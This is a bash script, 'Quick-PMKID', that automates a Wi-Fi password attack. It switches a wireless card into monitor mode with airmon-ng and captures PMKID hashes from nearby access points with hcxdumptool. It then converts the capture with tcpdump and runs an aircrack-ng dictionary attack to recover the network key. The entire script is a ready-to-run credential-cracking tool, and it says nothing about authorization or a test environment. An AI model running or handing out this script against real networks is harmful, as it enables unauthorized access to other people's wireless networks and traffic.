# Quick-PMKID
#easy pmkid capture
#! /bin/bash

echo "

"
echo "               
                       %%%%%%%%%%%%%%%%%%%%%%%
                       %%   Quick PMKID     %%
                       %%                   %%
                       %% script by chahine %%
                       %%%%%%%%%%%%%%%%%%%%%%%



"

#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


echo " 
           *** what do you want to do ? ***


"

read -p "
---------
1) To decrypt pmkid using aircrack + dictionary Press : 1

2) To restore managed mode Press: 2

3)===>To capture PMKID Press any key + [Enter] <=== 
_________

==> " air

clear

#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# use  aircrack-ng to crack alredy captered PMKID

if [[ $air -eq 1 ]]
then

echo " 
                ** if you are layzy drag and drop ** "

read -p "

---------
**Enter the path of the captured file that you want to crack ?: 
---------
==> " file 


read -p "


---------
**Enter the path of the dictionary file that you want to use
  to perforforme the cracking ?: 
---------
==> " crack 

sudo aircrack-ng $file -w  $crack

read -p " 

*** Time to exit  *** 
    press [Enter] 

==>"

exit

elif [[ $air  -eq 2 ]]
then
echo "

************************************************************************
*********************++++++++++++++++++*********************************

"
sudo airmon-ng

read -p "---------
**What is your monitor mode wlan name ?: 
---------
" wlanmon

sudo airmon-ng stop $wlanmon

sudo airmon-ng check kill

sudo service NetworkManager start

sudo airmon-ng

echo "

        *** managed mode restored ***
        

" 

exit

else 
:
fi

clear

echo " 
************************************************************************
********************************=***************************************
************************************************************************


"
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#use airmon-ng to capture PMKID

sudo airmon-ng

echo "

"

read -p "
---------
**if you are alredy in monitor mode type:1
**if you are not Press [Enter] key  
---------
==> " mode

echo "
************************************************************************
*********************++++++++++++++++++*********************************

"

if [[ $mode -eq 1 ]]
then
:

else         
sudo airmon-ng check kill

echo "
************************************************************************
*********************++++++++++++++++++*********************************


"
sudo airmon-ng


#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#selecting interface name in managed mode
echo "
"
read -p "---------
**What is your wlan name ?: 
---------
==> " wlan 

sudo airmon-ng start $wlan
fi

clear

echo "
************************************************************************
*********************++++++++++++++++++*********************************


"
sudo airmon-ng


#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#selecting interface name in monitor mode

echo "     
           
%% after the pmkid is capturid press ' Ctrl + C ' to exit %%


"

read -p "---------
**What is your monitor mode wlan name ?: 
---------
==> " wlan1 

clear

echo " 
    
%% press ' Ctrl + C ' to exit %%

"

#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# capture the pmkid

sudo hcxdumptool -o pmkid -i $wlan1 --enable_status 5

sudo file PMKID

sudo tcpdump -r pmkid -w pmkid.pcap

clear

echo "
************************************************************************
*********************++++++++++++++++++*********************************


"

read -p "
         ** if you are layzy drag and drop ** 
         
         
---------
**Enter the path of the dictionary file that you want to use
to perforforme the craking ?: 
---------
===> " dic 

sudo aircrack-ng pmkid.pcap -w  $dic



#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# exiting the script


echo " %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

** make your exciting chose ?"

read -p "---------
***to preseve monitor mode Press: 1
***to restore managed mode Press: 2
---------
==> " var



if [[ $var  -eq  1 ]]
then
:

#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# restoring managed mode

  
elif [[ $var  -eq 2 ]]
then
sudo airmon-ng stop $wlan1

sudo airmon-ng check kill

sudo service NetworkManager start

sudo airmon-ng

else
  echo "   
            ******************************
            * *****Wrong parameters***** *
            *                            *
            *    exting monitor mode     *
            ****************************** 
              
              
              
==>>>restoring managed mode<<<==
  
  "
sudo airmon-ng stop $wlan1

sudo airmon-ng check kill

sudo service NetworkManager start


  exit 1;
fi


#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
echo " 


                   *****it's donne*****           
                   ********************      
                           
                           
                           
                    "

#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
